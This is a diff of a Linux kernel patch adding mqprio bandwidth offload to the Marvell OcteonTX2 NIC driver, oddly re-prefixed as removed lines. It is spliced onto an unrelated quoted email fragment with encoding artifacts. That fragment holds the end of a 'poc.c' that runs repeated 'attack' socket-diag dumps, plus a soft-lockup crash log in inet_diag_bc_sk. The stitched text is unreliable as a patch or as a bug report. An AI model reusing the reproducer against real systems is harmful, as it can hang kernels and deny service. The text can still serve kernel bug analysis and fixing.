-+++ b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_tc.c
-@@ -16,6 +16,8 @@
- #include <net/tc_act/tc_mirred.h>
- #include <net/tc_act/tc_vlan.h>
- #include <net/ipv6.h>
-+#include <net/pkt_sched.h>
-+#include <net/sch_generic.h>
- 
- #include "cn10k.h"
- #include "otx2_common.h"
-@@ -31,6 +33,10 @@
- 
- #define MCAST_INVALID_GRP		(-1U)
- #define RATE_MANTISSA_BITS		8
-+/* Min per-queue egress shaping rate the NIX TLX encoder supports (2 Mbps). */
-+#define OTX2_MQPRIO_MIN_RATE_BYTES_PS	250000ULL
-+/* Max egress shaping rate the NIX TLX encoder supports (130816 Mbps). */
-+#define OTX2_MQPRIO_MAX_RATE_BYTES_PS	((MAX_BURST_SIZE * 1000000ULL) / 8ULL)
- 
- static void otx2_get_egress_burst_cfg(struct otx2_nic *nic, u32 burst,
- 				      u32 *burst_exp, u32 *burst_mantissa)
-@@ -61,6 +67,9 @@ static void otx2_get_egress_burst_cfg(struct otx2_nic *nic, u32 burst,
- 			*burst_mantissa = tmp / (1ULL << (*burst_exp - 7));
- 		}
- 	} else {
-+		/* burst 0: largest encodable burst (CN10K_MAX_BURST_SIZE on
-+		 * CN10K), not a minimal burst.
-+		 */
- 		*burst_exp = MAX_BURST_EXPONENT;
- 		*burst_mantissa = max_mantissa;
- 	}
-@@ -1600,14 +1609,709 @@ static int otx2_setup_tc_block(struct net_device *netdev,
- 					  nic, nic, ingress);
- }
- 
-+/* Free the per-queue min/max rate caches. */
-+static void otx2_mqprio_free_cache(struct otx2_nic *pfvf)
-+{
-+	devm_kfree(pfvf->dev, pfvf->mqprio.min_rate);
-+	devm_kfree(pfvf->dev, pfvf->mqprio.max_rate);
-+	pfvf->mqprio.min_rate = NULL;
-+	pfvf->mqprio.max_rate = NULL;
-+	pfvf->mqprio.flags = 0;
-+}
-+
-+static int otx2_mqprio_alloc_cache(struct otx2_nic *pfvf, bool replacing)
-+{
-+	u16 num_txq = pfvf->hw.non_qos_queues;
-+
-+	if (replacing && pfvf->mqprio.min_rate && pfvf->mqprio.max_rate) {
-+		memset(pfvf->mqprio.min_rate, 0,
-+		       num_txq * sizeof(*pfvf->mqprio.min_rate));
-+		memset(pfvf->mqprio.max_rate, 0,
-+		       num_txq * sizeof(*pfvf->mqprio.max_rate));
-+		pfvf->mqprio.flags = 0;
-+		return 0;
-+	}
-+
-+	otx2_mqprio_free_cache(pfvf);
-+
-+	pfvf->mqprio.min_rate = devm_kcalloc(pfvf->dev, num_txq,
-+					     sizeof(*pfvf->mqprio.min_rate),
-+					     GFP_KERNEL);
-+	pfvf->mqprio.max_rate = devm_kcalloc(pfvf->dev, num_txq,
-+					     sizeof(*pfvf->mqprio.max_rate),
-+					     GFP_KERNEL);
-+	if (!pfvf->mqprio.min_rate || !pfvf->mqprio.max_rate) {
-+		otx2_mqprio_free_cache(pfvf);
-+		return -ENOMEM;
-+	}
-+
-+	return 0;
-+}
-+
-+static void otx2_mqprio_snap_free(struct otx2_nic *pfvf,
-+				  struct mq_offload_snap **snap)
-+{
-+	if (!*snap)
-+		return;
-+
-+	devm_kfree(pfvf->dev, *snap);
-+	*snap = NULL;
-+}
-+
-+static int otx2_mqprio_snap_copy(struct otx2_nic *pfvf,
-+				 struct mq_offload_snap **dst,
-+				 const struct tc_mqprio_qopt_offload *mqprio)
-+{
-+	const struct tc_mqprio_qopt *qopt = &mqprio->qopt;
-+	struct mq_offload_snap *snap;
-+	int tc;
-+
-+	if (!*dst) {
-+		snap = devm_kzalloc(pfvf->dev, sizeof(*snap), GFP_KERNEL);
-+		if (!snap)
-+			return -ENOMEM;
-+		*dst = snap;
-+	} else {
-+		snap = *dst;
-+	}
-+
-+	snap->num_tc = qopt->num_tc;
-+	for (tc = 0; tc < TC_QOPT_MAX_QUEUE; tc++) {
-+		snap->count[tc] = qopt->count[tc];
-+		snap->offset[tc] = qopt->offset[tc];
-+		snap->min_rate[tc] = 0;
-+		snap->max_rate[tc] = 0;
-+	}
-+
-+	for (tc = 0; tc < qopt->num_tc; tc++) {
-+		if (mqprio->flags & TC_MQPRIO_F_MIN_RATE)
-+			snap->min_rate[tc] = mqprio->min_rate[tc];
-+		if (mqprio->flags & TC_MQPRIO_F_MAX_RATE)
-+			snap->max_rate[tc] = mqprio->max_rate[tc];
-+	}
-+
-+	return 0;
-+}
-+
-+static int otx2_mqprio_stage_cur(struct otx2_nic *pfvf,
-+				 const struct tc_mqprio_qopt_offload *mqprio)
-+{
-+	return otx2_mqprio_snap_copy(pfvf, &pfvf->cur_mq_snap, mqprio);
-+}
-+
-+static void otx2_mqprio_snap_commit(struct otx2_nic *pfvf)
-+{
-+	otx2_mqprio_snap_free(pfvf, &pfvf->old_mq_snap);
-+	pfvf->old_mq_snap = pfvf->cur_mq_snap;
-+	pfvf->cur_mq_snap = NULL;
-+}
-+
-+static void otx2_mqprio_clear_replace_state(struct otx2_nic *pfvf)
-+{
-+	pfvf->mqprio.replace_setup_done = false;
-+	pfvf->mqprio.replace_graft_done = false;
-+}
-+
-+static bool otx2_mqprio_mdq_allocated(struct otx2_nic *pfvf)
-+{
-+	return pfvf->hw.txschq_cnt[NIX_TXSCH_LVL_MDQ] != 0;
-+}
-+
-+static int otx2_mqprio_restore_old(struct otx2_nic *pfvf)
-+{
-+	struct mq_offload_snap *snap = pfvf->old_mq_snap;
-+	struct net_device *netdev = pfvf->netdev;
-+	u16 num_txq = pfvf->hw.non_qos_queues;
-+	int tc, txq, err;
-+
-+	if (!snap)
-+		return 0;
-+
-+	err = otx2_mqprio_alloc_cache(pfvf, false);
-+	if (err)
-+		return err;
-+
-+	memset(pfvf->mqprio.min_rate, 0, num_txq * sizeof(*pfvf->mqprio.min_rate));
-+	memset(pfvf->mqprio.max_rate, 0, num_txq * sizeof(*pfvf->mqprio.max_rate));
-+	pfvf->mqprio.flags = 0;
-+
-+	for (tc = 0; tc < snap->num_tc; tc++) {
-+		u64 min_rate = snap->min_rate[tc];
-+		u64 max_rate = snap->max_rate[tc];
-+
-+		if (min_rate)
-+			pfvf->mqprio.flags |= TC_MQPRIO_F_MIN_RATE;
-+		if (max_rate)
-+			pfvf->mqprio.flags |= TC_MQPRIO_F_MAX_RATE;
-+
-+		for (txq = snap->offset[tc];
-+		     txq < snap->offset[tc] + snap->count[tc]; txq++) {
-+			pfvf->mqprio.min_rate[txq] = min_rate;
-+			pfvf->mqprio.max_rate[txq] = max_rate;
-+		}
-+	}
-+
-+	netdev_set_num_tc(netdev, snap->num_tc);
-+	for (tc = 0; tc < snap->num_tc; tc++)
-+		netdev_set_tc_queue(netdev, tc, snap->count[tc],
-+				    snap->offset[tc]);
-+
-+	if (otx2_mqprio_mdq_allocated(pfvf)) {
-+		err = otx2_nix_tm_clear_queue_shaper(pfvf);
-+		if (err)
-+			return err;
-+	}
-+
-+	/* otx2_mqprio_restart_netdev() clears rate_limit when ndo_open() fails. */
-+	pfvf->mqprio.rate_limit = true;
-+
-+	err = otx2_mqprio_up(pfvf);
-+	if (err)
-+		return err;
-+
-+	otx2_mqprio_snap_free(pfvf, &pfvf->cur_mq_snap);
-+
-+	return 0;
-+}
-+
-+static void otx2_mqprio_snap_destroy(struct otx2_nic *pfvf)
-+{
-+	otx2_mqprio_snap_free(pfvf, &pfvf->cur_mq_snap);
-+	otx2_mqprio_snap_free(pfvf, &pfvf->old_mq_snap);
-+}
-+
-+static void otx2_mqprio_clear_sw(struct otx2_nic *pfvf)
-+{
-+	struct net_device *netdev = pfvf->netdev;
-+
-+	pfvf->mqprio.rate_limit = false;
-+	otx2_mqprio_clear_replace_state(pfvf);
-+	netdev_set_num_tc(netdev, 0);
-+	otx2_mqprio_free_cache(pfvf);
-+}
-+
-+/* Tear down mqprio bandwidth offload: clear per-queue shapers,
-+ * mqprio_rate_limit, netdev TC mappings, and the cached rates.  Called on
-+ * explicit mqprio teardown (tc qdisc del) and error cleanup, not on
-+ * routine netdev stop/open cycles where the offload stays active.
-+ */
-+int otx2_mqprio_down(struct otx2_nic *pfvf)
-+{
-+	int err = 0;
-+
-+	if (!pfvf->mqprio.rate_limit)
-+		return 0;
-+
-+	if (netif_running(pfvf->netdev) &&
-+	    otx2_mqprio_mdq_allocated(pfvf))
-+		err = otx2_nix_tm_clear_queue_shaper(pfvf);
-+
-+	otx2_mqprio_clear_sw(pfvf);
-+
-+	if (err) {
-+		netdev_err(pfvf->netdev,
-+			   "mqprio: failed to clear hardware shapers: %d; some TX queues may retain bandwidth limits\n",
-+			   err);
-+	}
-+
-+	return err;
-+}
-+
-+int otx2_mqprio_up(struct otx2_nic *pfvf)
-+{
-+	struct net_device *netdev = pfvf->netdev;
-+	int txq, err;
-+
-+	if (!pfvf->mqprio.rate_limit)
-+		return 0;
-+
-+	if (!pfvf->mqprio.min_rate || !pfvf->mqprio.max_rate)
-+		return 0;
-+
-+	for (txq = 0; txq < pfvf->hw.non_qos_queues; txq++) {
-+		u64 min_rate = 0, max_rate = 0;
-+
-+		if (pfvf->mqprio.flags & TC_MQPRIO_F_MIN_RATE)
-+			min_rate = pfvf->mqprio.min_rate[txq];
-+		if (pfvf->mqprio.flags & TC_MQPRIO_F_MAX_RATE)
-+			max_rate = pfvf->mqprio.max_rate[txq];
-+
-+		if (!min_rate && !max_rate)
-+			continue;
-+
-+		err = otx2_nix_tm_set_queue_shaper(pfvf, txq, min_rate,
-+						   max_rate);
-+		if (err) {
-+			netdev_err(netdev,
-+				   "mqprio: failed to restore shaper for txq %d: %d\n",
-+				   txq, err);
-+			return err;
-+		}
-+	}
-+
-+	return 0;
-+}
-+
-+/* Restart the netdev to reprogram the TX scheduler hierarchy for mqprio
-+ * bandwidth offload.  Both mqprio add and delete (when offload was active)
-+ * take this path via ndo_stop()/ndo_open() so VF-specific open logic (e.g.
-+ * LBK carrier on) runs correctly.  The full stop/open cycle clears
-+ * carrier, stops all TX queues, tears down IRQs/NAPI and drops in-flight
-+ * traffic.  If open fails, the interface is left administratively down
-+ * without calling ndo_stop() again on resources already torn down by
-+ * the open error path.
-+ *
-+ * Do not call dev_deactivate()/dev_activate() here: this runs from
-+ * ndo_setup_tc() while qdisc_graft() may already hold the device
-+ * deactivated and must perform the final dev_activate().
-+ */
-+static int otx2_mqprio_restart_netdev(struct net_device *netdev, bool rate_limit)
-+{
-+	struct otx2_nic *pfvf = netdev_priv(netdev);
-+	const struct net_device_ops *ops = netdev->netdev_ops;
-+	int err;
-+
-+	/* TODO: Explore live TX scheduler reprogramming to avoid a full
-+	 * ndo_stop()/ndo_open() bounce on every mqprio change.
-+	 */
-+	netdev_info(netdev,
-+		    "mqprio: restarting interface to reprogram TX scheduler; in-flight traffic will be dropped\n");
-+
-+	err = ops->ndo_stop(netdev);
-+	if (err)
-+		return err;
-+
-+	/* Set before ndo_open() so otx2_txsch_alloc() widens SMQ allocation.
-+	 * On teardown, drop mqprio software state so ndo_open() does not
-+	 * re-apply bandwidth limits via otx2_mqprio_up() after the kernel
-+	 * removed the qdisc.
-+	 */
-+	if (rate_limit)
-+		pfvf->mqprio.rate_limit = true;
-+	else
-+		otx2_mqprio_clear_sw(pfvf);
-+
-+	err = ops->ndo_open(netdev);
-+	if (err) {
-+		netdev_err(netdev,
-+			   "Failed to restart device after mqprio change: %d\n",
-+			   err);
-+		/* ndo_open() already freed the TX schedulers on failure while
-+		 * netif_running() may still be true; drop mqprio software state
-+		 * only instead of sending shaper clears to freed queues.
-+		 */
-+		otx2_mqprio_clear_sw(pfvf);
-+		/* ndo_open() rolls back on failure; mark the interface down so
-+		 * netif_close() does not invoke ndo_stop() on freed NAPI/queue
-+		 * state. Caller holds RTNL; dev_close() would deadlock.
-+		 */
-+		pfvf->flags |= OTX2_FLAG_INTF_DOWN;
-+		/* visible to otx2_stop() on other cpus */
-+		smp_wmb();
-+		netif_close(netdev);
-+	}
-+
-+	return err;
-+}
-+
-+static int otx2_mqprio_validate_tc_rate(struct net_device *netdev,
-+					struct netlink_ext_ack *extack,
-+					u64 rate, u32 qcount, int tc,
-+					const char *name)
-+{
-+	if (!rate)
-+		return 0;
-+
-+	if (qcount <= 1)
-+		return 0;
-+
-+	/* TODO: mqprio min_rate/max_rate are per traffic class, but bandwidth
-+	 * offload shapes on per-queue MDQ nodes parented under a single TL4.
-+	 * Without per-TC TL4 shapers the driver cannot honor TC-level limits
-+	 * for a traffic class that spans multiple queues without either
-+	 * dividing the rate across queues (uAPI mismatch) or exceeding the TC
-+	 * cap when every member queue is active. Reject until per-TC TL4
-+	 * shaping can be implemented without allocating additional TL4 nodes
-+	 * beyond the existing hierarchy.
-+	 */
-+	netdev_err(netdev,
-+		   "mqprio: %s rate for tc %d not supported with %u queues\n",
-+		   name, tc, qcount);
-+	NL_SET_ERR_MSG_FMT_MOD(extack,
-+			       "mqprio: %s rate for tc %d not supported with %u queues",
-+			       name, tc, qcount);
-+	return -EOPNOTSUPP;
-+}
-+
-+static int otx2_mqprio_validate_txqs(struct net_device *netdev,
-+				     struct netlink_ext_ack *extack,
-+				     struct tc_mqprio_qopt *qopt)
-+{
-+	struct otx2_nic *pfvf = netdev_priv(netdev);
-+	u16 num_txq = pfvf->hw.non_qos_queues;
-+	int tc, txq;
-+
-+	if (qopt->num_tc > num_txq) {
-+		netdev_err(netdev, "Number of TCs (%u) exceeds hw queues %u\n",
-+			   qopt->num_tc, num_txq);
-+		NL_SET_ERR_MSG_FMT_MOD(extack,
-+				       "Number of TCs (%u) exceeds hw queues %u",
-+				       qopt->num_tc, num_txq);
-+		return -EINVAL;
-+	}
-+
-+	if (num_txq > MAX_TXSCHQ_PER_FUNC) {
-+		netdev_err(netdev,
-+			   "Number of queues (%u) exceeds max scheduler queues %u\n",
-+			   num_txq, MAX_TXSCHQ_PER_FUNC);
-+		NL_SET_ERR_MSG_FMT_MOD(extack,
-+				       "Number of queues (%u) exceeds max scheduler queues %u",
-+				       num_txq, MAX_TXSCHQ_PER_FUNC);
-+		return -EINVAL;
-+	}
-+
-+	for (tc = 0; tc < qopt->num_tc; tc++) {
-+		u32 qcount = qopt->count[tc];
-+
-+		for (txq = qopt->offset[tc];
-+		     txq < qopt->offset[tc] + qcount; txq++) {
-+			if (txq >= num_txq) {
-+				netdev_err(netdev,
-+					   "mqprio: txq %d exceeds offload queue count %u\n",
-+					   txq, num_txq);
-+				NL_SET_ERR_MSG_FMT_MOD(extack,
-+						       "mqprio: txq %d exceeds offload queue count %u",
-+						       txq, num_txq);
-+				return -EINVAL;
-+			}
-+		}
-+	}
-+
-+	return 0;
-+}
-+
-+static bool otx2_mqprio_rate_valid(u64 rate_bytes_ps)
-+{
-+	u64 mbps;
-+
-+	if (!rate_bytes_ps)
-+		return true;
-+
-+	if (rate_bytes_ps < OTX2_MQPRIO_MIN_RATE_BYTES_PS)
-+		return false;
-+
-+	if (rate_bytes_ps > OTX2_MQPRIO_MAX_RATE_BYTES_PS)
-+		return false;
-+
-+	if (rate_bytes_ps > div_u64(U64_MAX, 8))
-+		return false;
-+
-+	mbps = otx2_convert_rate(rate_bytes_ps);
-+	return ilog2(mbps / 2) <= MAX_RATE_EXPONENT;
-+}
-+
-+static int otx2_teardown_tc_mqprio(struct otx2_nic *pfvf,
-+				   struct tc_mqprio_qopt_offload *mqprio)
-+{
-+	struct tc_mqprio_qopt *qopt = &mqprio->qopt;
-+	bool had_mqprio = pfvf->mqprio.rate_limit;
-+	struct net_device *netdev = pfvf->netdev;
-+	bool if_up = netif_running(netdev);
-+	int err;
-+
-+	qopt->hw = 0;
-+
-+	/* tc qdisc replace runs setup on the new mqprio before destroying the
-+	 * old one. replace_setup_done and TC_ROOT_GRAFT distinguish stale
-+	 * old-instance teardown from graft failure after setup.
-+	 */
-+	if (pfvf->mqprio.replace_setup_done && pfvf->cur_mq_snap) {
-+		err = 0;
-+		if (pfvf->mqprio.replace_graft_done)
-+			otx2_mqprio_snap_commit(pfvf);
-+		else
-+			err = otx2_mqprio_restore_old(pfvf);
-+		otx2_mqprio_clear_replace_state(pfvf);
-+		return err;
-+	}
-+
-+	/* Skip the netdev restart when mqprio offload was not active. */
-+	if (!had_mqprio)
-+		return 0;
-+
-+	if (if_up) {
-+		int down_err, err;
-+
-+		down_err = otx2_mqprio_down(pfvf);
-+		err = otx2_mqprio_restart_netdev(netdev, false);
-+		if (err)
-+			return err;
-+		return down_err;
-+	}
-+
-+	/* ndo_stop() already freed the TX scheduler TL nodes; drop software
-+	 * state only.
-+	 */
-+	otx2_mqprio_clear_sw(pfvf);
-+	return 0;
-+}
-+
-+static int otx2_setup_tc_mqprio(struct net_device *netdev,
-+				struct tc_mqprio_qopt_offload *mqprio)
-+{
-+	struct netlink_ext_ack *extack = mqprio->extack;
-+	struct otx2_nic *pfvf = netdev_priv(netdev);
-+	struct tc_mqprio_qopt *qopt = &mqprio->qopt;
-+	bool replacing = pfvf->mqprio.rate_limit;
-+	bool if_up = netif_running(netdev);
-+	int tc, txq, err, i;
-+
-+	if (!qopt->hw)
-+		return otx2_teardown_tc_mqprio(pfvf, mqprio);
-+
-+	if (!if_up) {
-+		netdev_err(netdev, "mqprio: setup requires interface UP\n");
-+		NL_SET_ERR_MSG_MOD(extack, "mqprio: setup requires interface UP");
-+		return -EOPNOTSUPP;
-+	}
-+
-+	if (mqprio->shaper != TC_MQPRIO_SHAPER_BW_RATE) {
-+		netdev_err(netdev, "Unsupported mqprio shaper %#x\n", mqprio->shaper);
-+		NL_SET_ERR_MSG_FMT_MOD(extack, "Unsupported mqprio shaper %#x",
-+				       mqprio->shaper);
-+		return -EOPNOTSUPP;
-+	}
-+
-+	if (!test_bit(QOS_CIR_PIR_SUPPORT, &pfvf->hw.cap_flag)) {
-+		netdev_err(netdev,
-+			   "mqprio: bandwidth offload requires CIR+PIR support\n");
-+		NL_SET_ERR_MSG_MOD(extack,
-+				   "mqprio: bandwidth offload requires CIR+PIR support");
-+		return -EOPNOTSUPP;
-+	}
-+
-+	if (is_otx2_sdp_rep(pfvf->pdev)) {
-+		netdev_err(netdev, "mqprio: bandwidth offload not supported on SDP rep\n");
-+		NL_SET_ERR_MSG_MOD(extack,
-+				   "mqprio: bandwidth offload not supported on SDP rep");
-+		return -EOPNOTSUPP;
-+	}
-+
-+	if (pfvf->pfc_en) {
-+		netdev_err(netdev,
-+			   "mqprio: cannot enable offload while PFC is enabled\n");
-+		NL_SET_ERR_MSG_MOD(extack,
-+				   "mqprio: cannot enable offload while PFC is enabled");
-+		return -EOPNOTSUPP;
-+	}
-+
-+	if (pfvf->xdp_prog) {
-+		netdev_err(netdev,
-+			   "mqprio: cannot enable offload while XDP is active\n");
-+		NL_SET_ERR_MSG_MOD(extack,
-+				   "mqprio: cannot enable offload while XDP is active");
-+		return -EOPNOTSUPP;
-+	}
-+
-+	for (tc = 0; tc < qopt->num_tc; tc++) {
-+		u64 min_rate = 0, max_rate = 0;
-+		u32 qcount = qopt->count[tc];
-+
-+		if (mqprio->flags & TC_MQPRIO_F_MIN_RATE)
-+			min_rate = mqprio->min_rate[tc];
-+		if (mqprio->flags & TC_MQPRIO_F_MAX_RATE)
-+			max_rate = mqprio->max_rate[tc];
-+
-+		if (min_rate && max_rate && min_rate > max_rate) {
-+			netdev_err(netdev,
-+				   "min_rate %llu exceeds max_rate %llu for tc %d\n",
-+				   min_rate, max_rate, tc);
-+			NL_SET_ERR_MSG_FMT_MOD(extack,
-+					       "min_rate %llu exceeds max_rate %llu for tc %d",
-+					       min_rate, max_rate, tc);
-+			return -EINVAL;
-+		}
-+
-+		if (mqprio->flags & TC_MQPRIO_F_MIN_RATE) {
-+			err = otx2_mqprio_validate_tc_rate(netdev, extack, min_rate,
-+							   qcount, tc, "min");
-+			if (err)
-+				return err;
-+		}
-+
-+		if (mqprio->flags & TC_MQPRIO_F_MAX_RATE) {
-+			err = otx2_mqprio_validate_tc_rate(netdev, extack, max_rate,
-+							   qcount, tc, "max");
-+			if (err)
-+				return err;
-+		}
-+
-+		if (mqprio->flags & TC_MQPRIO_F_MIN_RATE &&
-+		    !otx2_mqprio_rate_valid(min_rate)) {
-+			netdev_err(netdev,
-+				   "mqprio: min_rate %llu for tc %d is outside hardware limits\n",
-+				   min_rate, tc);
-+			NL_SET_ERR_MSG_FMT_MOD(extack,
-+					       "mqprio: min_rate %llu for tc %d is outside hardware limits",
-+					       min_rate, tc);
-+			return -EINVAL;
-+		}
-+
-+		if (mqprio->flags & TC_MQPRIO_F_MAX_RATE &&
-+		    !otx2_mqprio_rate_valid(max_rate)) {
-+			netdev_err(netdev,
-+				   "mqprio: max_rate %llu for tc %d is outside hardware limits\n",
-+				   max_rate, tc);
-+			NL_SET_ERR_MSG_FMT_MOD(extack,
-+					       "mqprio: max_rate %llu for tc %d is outside hardware limits",
-+					       max_rate, tc);
-+			return -EINVAL;
-+		}
-+	}
-+
-+	err = otx2_mqprio_validate_txqs(netdev, extack, qopt);
-+	if (err)
-+		return err;
-+
-+	err = otx2_mqprio_stage_cur(pfvf, mqprio);
-+	if (err)
-+		return err;
-+
-+	err = otx2_mqprio_restart_netdev(pfvf->netdev, true);
-+	if (err)
-+		goto cleanup;
-+
-+	err = otx2_mqprio_alloc_cache(pfvf, replacing);
-+	if (err)
-+		goto cleanup;
-+
-+	/* otx2_mqprio_up() may have restored the previous configuration during
-+	 * the restart above. Clear every MDQ shaper before applying the new
-+	 * mapping so queues dropped from the TC layout do not keep stale
-+	 * limits in hardware.
-+	 */
-+	if (otx2_mqprio_mdq_allocated(pfvf)) {
-+		err = otx2_nix_tm_clear_queue_shaper(pfvf);
-+		if (err)
-+			goto cleanup;
-+	}
-+
-+	pfvf->mqprio.flags = mqprio->flags;
-+
-+	for (tc = 0; tc < qopt->num_tc; tc++) {
-+		u64 min_rate = 0, max_rate = 0;
-+		u32 qcount = qopt->count[tc];
-+
-+		/* Rates omitted from tc mqprio are passed as zero and both MDQ
-+		 * shaper registers are programmed; see
-+		 * otx2_nix_tm_set_queue_shaper(). Multi-queue TCs with rates
-+		 * are rejected above.
-+		 */
-+		if (mqprio->flags & TC_MQPRIO_F_MIN_RATE)
-+			min_rate = mqprio->min_rate[tc];
-+		if (mqprio->flags & TC_MQPRIO_F_MAX_RATE)
-+			max_rate = mqprio->max_rate[tc];
-+
-+		for (txq = qopt->offset[tc];
-+		     txq < qopt->offset[tc] + qcount; txq++) {
-+			netdev_dbg(netdev,
-+				   "mqprio: tc %d txq %d min_rate %llu max_rate %llu\n",
-+				   tc, txq, min_rate, max_rate);
-+
-+			pfvf->mqprio.min_rate[txq] = min_rate;
-+			pfvf->mqprio.max_rate[txq] = max_rate;
-+
-+			err = otx2_nix_tm_set_queue_shaper(pfvf, txq,
-+							   min_rate, max_rate);
-+			if (err)
-+				goto cleanup;
-+		}
-+	}
-+
-+	netdev_set_num_tc(netdev, pfvf->cur_mq_snap->num_tc);
-+	for (i = 0; i < pfvf->cur_mq_snap->num_tc; i++)
-+		netdev_set_tc_queue(netdev, i, pfvf->cur_mq_snap->count[i],
-+				    qopt->offset[i]);
-+
-+	qopt->hw = TC_MQPRIO_HW_OFFLOAD_TCS;
-+
-+	if (replacing) {
-+		pfvf->mqprio.replace_setup_done = true;
-+		pfvf->mqprio.replace_graft_done = false;
-+	} else {
-+		otx2_mqprio_snap_commit(pfvf);
-+	}
-+
-+	return 0;
-+
-+cleanup:
-+	qopt->hw = 0;
-+	if (replacing) {
-+		int restore_err = otx2_mqprio_restore_old(pfvf);
-+
-+		otx2_mqprio_clear_replace_state(pfvf);
-+		if (restore_err) {
-+			netdev_err(netdev,
-+				   "mqprio: replace failed and prior configuration rollback failed: %d\n",
-+				   restore_err);
-+			if (extack)
-+				NL_SET_ERR_MSG_FMT_MOD(extack,
-+						       "mqprio: replace failed and prior configuration rollback failed: %d",
-+						       restore_err);
-+		} else {
-+			netdev_err(netdev,
-+				   "mqprio: replace failed; prior configuration restored\n");
-+			if (extack)
-+				NL_SET_ERR_MSG_MOD(extack,
-+						   "mqprio: replace failed; prior configuration restored");
-+		}
-+		return err ? err : -EIO;
-+	}
-+	otx2_teardown_tc_mqprio(pfvf, mqprio);
-+	return err;
-+}
-+
-+static int otx2_setup_tc_root(struct otx2_nic *pfvf,
-+			      struct tc_root_qopt_offload *root)
-+{
-+	switch (root->command) {
-+	case TC_ROOT_GRAFT:
-+		if (pfvf->mqprio.replace_setup_done)
-+			pfvf->mqprio.replace_graft_done = true;
-+		return 0;
-+	default:
-+		return -EOPNOTSUPP;
-+	}
-+}
-+
-+static int otx2_setup_tc_query_caps(void *type_data)
-+{
-+	struct tc_query_caps_base *base = type_data;
-+	struct tc_mqprio_caps *caps;
-+
-+	if (base->type != TC_SETUP_QDISC_MQPRIO)
-+		return -EOPNOTSUPP;
-+
-+	caps = base->caps;
-+	caps->validate_queue_counts = true;
-+
-+	return 0;
-+}
-+
- int otx2_setup_tc(struct net_device *netdev, enum tc_setup_type type,
- 		  void *type_data)
- {
- 	switch (type) {
-+	case TC_QUERY_CAPS:
-+		return otx2_setup_tc_query_caps(type_data);
- 	case TC_SETUP_BLOCK:
- 		return otx2_setup_tc_block(netdev, type_data);
- 	case TC_SETUP_QDISC_HTB:
- 		return otx2_setup_tc_htb(netdev, type_data);
-+	case TC_SETUP_QDISC_MQPRIO:
-+		return otx2_setup_tc_mqprio(netdev, type_data);
-+	case TC_SETUP_ROOT_QDISC:
-+		return otx2_setup_tc_root(netdev_priv(netdev), type_data);
- 	default:
- 		return -EOPNOTSUPP;
- 	}
-@@ -1632,6 +2336,7 @@ EXPORT_SYMBOL(otx2_init_tc);
- void otx2_shutdown_tc(struct otx2_nic *nic)
- {
- 	otx2_destroy_tc_flow_list(nic);
-+	otx2_mqprio_snap_destroy(nic);
- }
- EXPORT_SYMBOL(otx2_shutdown_tc);
- 
-diff --git a/drivers/net/ethernet/marvell/octeontx2/nic/qos.c b/drivers/net/ethernet/marvell/octeontx2/nic/qos.c
-index 69c0911e28e9..d9af182e5721 100644
---- a/drivers/net/ethernet/marvell/octeontx2/nic/qos.c
-+++ b/drivers/net/ethernet/marvell/octeontx2/nic/qos.c
-@@ -118,6 +118,9 @@ static void otx2_config_sched_shaping(struct otx2_nic *pfvf,
- 	/* configure PIR */
- 	maxrate = (node->rate > node->ceil) ? node->rate : node->ceil;
- 
-+	/* 65536 is the kernel-side default burst when HTB does not supply an
-+	 * explicit value, not the NIX hardware maximum (CN10K_MAX_BURST_SIZE).
-+	 */
- 	cfg->regval[*num_regs] =
- 		otx2_get_txschq_rate_regval(pfvf, maxrate, 65536);
- 	(*num_regs)++;
--- 
-2.43.0
+> >                         teardown_sockets(fds, opts.groups * opts.socket=
+s);
+> >                         return 1;
+> >                 }
+> >                 printf("baseline wall_ms=3D%.3f\n", wall_ms);
+> >         }
+> >
+> >         if (opts.attack) {
+> >                 for (i =3D 0; i < opts.repeat; i++) {
+> >                         double wall_ms;
+> >
+> >                         if (run_dump(opts.listen_mode, true, opts.nops,=
+ &wall_ms) < 0) {
+> >                                 teardown_sockets(fds, opts.groups * opt=
+s.sockets);
+> >                                 return 1;
+> >                         }
+> >                         printf("attack_run=3D%u wall_ms=3D%.3f\n", i + =
+1, wall_ms);
+> >                 }
+> >         }
+> >
+> >         teardown_sockets(fds, opts.groups * opts.sockets);
+> >         return 0;
+> > }
+> > ------END poc.c--------
+> >
+> > ----BEGIN crash log----
+> > watchdog: BUG: soft lockup - CPU#1 stuck for 3s! [poc:256]
+> > [   21.507468] Modules linked in:
+> > [   21.507471] CPU: 1 UID: 0 PID: 256 Comm: poc Not tainted 7.2.0-rc4-0=
+0390-g743916aa8e8c #5 PREEMPT(full)
+> > [   21.507472] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a=
+rch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+> > [   21.507473] RIP: 0010:inet_diag_bc_sk (inet_diag.c:471 inet_diag.c:6=
+31)
+> > [   21.507499] Code: 00 00 00 0f 87 89 00 00 00 3c 02 0f 84 4e 01 00 00=
+ 3c 03 0f 84 72 01 00 00 3c 01 75 31 0f b7 53 02 29 d5 48 01 d3 85 ed 7e 31=
+ <0f> b6 03 3c 08 76 c2 3c 0b 0f 84 76 01 00 00 77 3a 3c 09 0f 84 54
+> > All code
+> > =3D=3D=3D=3D=3D=3D=3D=3D
+> >    0:   00 00                   add    %al,(%rax)
+> >    2:   00 0f                   add    %cl,(%rdi)
+> >    4:   87 89 00 00 00 3c       xchg   %ecx,0x3c000000(%rcx)
+> >    a:   02 0f                   add    (%rdi),%cl
+> >    c:   84 4e 01                test   %cl,0x1(%rsi)
+> >    f:   00 00                   add    %al,(%rax)
+> >   11:   3c 03                   cmp    $0x3,%al
+> >   13:   0f 84 72 01 00 00       je     0x18b
+> >   19:   3c 01                   cmp    $0x1,%al
+> >   1b:   75 31                   jne    0x4e
+> >   1d:   0f b7 53 02             movzwl 0x2(%rbx),%edx
+> >   21:   29 d5                   sub    %edx,%ebp
+> >   23:   48 01 d3                add    %rdx,%rbx
+> >   26:   85 ed                   test   %ebp,%ebp
+> >   28:   7e 31                   jle    0x5b
+> >   2a:*  0f b6 03                movzbl (%rbx),%eax              <-- tra=
+pping instruction
+> >   2d:   3c 08                   cmp    $0x8,%al
+> >   2f:   76 c2                   jbe    0xfffffffffffffff3
+> >   31:   3c 0b                   cmp    $0xb,%al
+> >   33:   0f 84 76 01 00 00       je     0x1af
+> >   39:   77 3a                   ja     0x75
+> >   3b:   3c 09                   cmp    $0x9,%al
+> >   3d:   0f                      .byte 0xf
+> >   3e:   84                      .byte 0x84
+> >   3f:   54                      push   %rsp
+> >
+> > Code starting with the faulting instruction
